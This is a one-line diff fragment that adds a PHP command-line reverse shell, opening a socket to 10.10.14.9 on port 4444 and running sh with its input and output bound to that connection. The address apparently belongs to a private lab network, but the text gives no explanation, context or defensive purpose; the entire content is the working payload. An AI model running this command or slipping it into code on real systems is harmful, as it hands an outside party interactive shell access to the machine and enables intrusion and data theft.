@@ -1,0 +1,1 @@
+php -r '$sock=fsockopen("10.10.14.9",4444);shell_exec("sh <&3 >&3 2>&3");'
